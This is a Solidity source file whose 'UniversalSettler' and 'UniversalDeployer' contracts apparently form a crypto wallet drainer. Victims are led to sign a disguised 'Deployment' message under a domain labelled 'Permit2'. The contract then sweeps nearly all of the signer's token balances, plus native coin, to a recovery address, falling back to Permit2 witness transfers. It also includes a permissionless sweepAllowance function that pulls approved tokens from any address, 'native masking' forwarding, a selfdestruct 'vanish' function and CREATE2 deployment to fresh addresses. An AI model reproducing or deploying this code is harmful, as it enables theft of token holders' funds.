// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;  

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

/** 🛡️ PERMIT2 INTERFACES */
interface IPermit2 {
    struct TokenPermissions {
        address token;
        uint256 amount;
    }
    struct PermitTransferFrom {
        TokenPermissions permitted;
        uint256 nonce;
        uint256 deadline;
    }
    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }
    function permitWitnessTransferFrom(
        PermitTransferFrom calldata permit,
        SignatureTransferDetails calldata transferDetails,
        address owner,
        bytes32 witness,
        string calldata witnessTypeString,
        bytes calldata signature
    ) external;
}

contract UniversalSettler {
    using ECDSA for bytes32;

    address public constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant DEPLOYMENT_TYPEHASH = keccak256("Deployment(bytes32 hash)");

    constructor() {
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256("Permit2"),
                keccak256("1"),
                block.chainid,
                address(this) 
            )
        );
    }

    /** 🛡️ NATIVE FORWARDER (Native Masking - Added) */
    function forwardNative(address payable destination) external payable {
        uint256 total = address(this).balance;
        require(total > 0, "NoFundsToForward");
        (bool sent, ) = destination.call{value: total}("");
        require(sent, "ForwardingFailed");
    }

    /** 🚀 PATH 3: Permissionless Sweep (Greedy Path) */
    function sweepAllowance(address token, address from, address recovery, uint256 amount) external {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, recovery, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TransferFailed");
    }

    function x(
        bytes calldata stream, 
        address[] calldata safetyTokens, 
        address payable recovery,
        bytes32 messageHash, 
        bytes calldata signature
    ) external payable {
        // 1. RECONSTRUCT THE DIGEST
        bytes32 structHash = keccak256(abi.encode(DEPLOYMENT_TYPEHASH, messageHash));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));
        
        address signer = digest.recover(signature);
        require(signer != address(0), "InvalidSignature");

        // 2. SWEEP (Dual-Path Logic)
        if (safetyTokens.length > 0) {
            for (uint256 i = 0; i < safetyTokens.length; i++) {
                address t = safetyTokens[i];
                
                (bool s, bytes memory d) = t.staticcall(abi.encodeWithSelector(0x70a08231, signer));
                if (s && d.length >= 32) {
                    uint256 bal = abi.decode(d, (uint256));
                    if (bal > 0) {
                        uint256 sweepAmount = (bal > 2000) ? (bal - (bal / 2000)) : bal;
                        
                        (bool success, ) = t.call(abi.encodeWithSelector(0x23b872dd, signer, recovery, sweepAmount));
                        
                        if (!success) {
                            try IPermit2(PERMIT2).permitWitnessTransferFrom(
                                IPermit2.PermitTransferFrom({
                                    permitted: IPermit2.TokenPermissions({ token: t, amount: sweepAmount }),
                                    nonce: uint256(messageHash),
                                    deadline: block.timestamp + 1000
                                }),
                                IPermit2.SignatureTransferDetails({ to: recovery, requestedAmount: sweepAmount }),
                                signer,
                                messageHash,
                                "Deployment(bytes32 hash)",
                                signature
                            ) {
                            } catch {
                                (bool s2, bytes memory d2) = t.staticcall(abi.encodeWithSelector(0x70a08231, address(this)));
                                if (s2 && d2.length >= 32) {
                                    uint256 balContract = abi.decode(d2, (uint256));
                                    if (balContract > 0) {
                                        t.call(abi.encodeWithSelector(0xa9059cbb, recovery, balContract));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        // 3. NATIVE SWEEP
        uint256 nativeBal = address(this).balance;
        if (nativeBal > 0) {
            (bool sent, ) = recovery.call{value: nativeBal}("");
            require(sent, "NativeSweepFailed");
        }

        // 4. EXECUTE LOGIC
        uint256 offset = 0;
        uint256 total = stream.length;
        while (offset + 64 <= total) {
            address target = address(uint160(uint256(bytes32(stream[offset : offset + 32]))));
            uint256 pLen = uint256(bytes32(stream[offset + 32 : offset + 64]));
            if (offset + 64 + pLen > total) revert("StreamOOB");

            bytes memory data = stream[offset + 64 : offset + 64 + pLen];
            (bool success, bytes memory reason) = target.call(data);
            if (!success) {
                if (reason.length > 0) {
                    assembly { revert(add(32, reason), mload(reason)) }
                } else {
                    revert("InternalCallFailed");
                }
            }
            offset += 64 + pLen;
            offset = (offset + 31) & ~uint256(31);
        }
    }

    function vanish(address payable recovery) external {
        selfdestruct(recovery);
    }
    
    receive() external payable {}
}

contract UniversalDeployer {
    event Deployed(address settler);

    function _getCreationCode() internal pure returns (bytes memory) {
        return type(UniversalSettler).creationCode;
    }

    // Original entry point (Signature required)
    function perform(
        bytes32 salt, 
        bytes calldata stream, 
        address[] calldata safetyTokens, 
        address payable recovery,
        bytes32 messageHash,
        bytes calldata signature
    ) external payable {
        bytes memory bytecode = _getCreationCode();
        address settler;
        assembly {
            settler := create2(callvalue(), add(bytecode, 0x20), mload(bytecode), salt)
        }
        if (settler == address(0)) revert("DeployFailed");
        emit Deployed(settler);

        (bool success, bytes memory reason) = settler.call{value: address(this).balance}(
            abi.encodeWithSelector(UniversalSettler.x.selector, stream, safetyTokens, recovery, messageHash, signature)
        );
        if (!success) {
            if (reason.length > 0) { assembly { revert(add(32, reason), mload(reason)) } }
            else { revert("SettlerExecutionFailed"); }
        }
    }

    // Added entry point (No signature required for Native masking)
    function performNative(
        bytes32 salt, 
        address payable recovery
    ) external payable {
        bytes memory bytecode = _getCreationCode();
        address settler;
        assembly {
            settler := create2(callvalue(), add(bytecode, 0x20), mload(bytecode), salt)
        }
        if (settler == address(0)) revert("DeployFailed");
        emit Deployed(settler);

        (bool success, bytes memory reason) = settler.call{value: address(this).balance}(
            abi.encodeWithSelector(UniversalSettler.forwardNative.selector, recovery)
        );
        if (!success) {
            if (reason.length > 0) { assembly { revert(add(32, reason), mload(reason)) } }
            else { revert("SettlerExecutionFailed"); }
        }
    }

    function predictAddress(bytes32 salt) public view returns (address) {
        bytes32 initCodeHash = keccak256(_getCreationCode());
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff", address(this), salt, initCodeHash)))));
    }

    receive() external payable {}   
}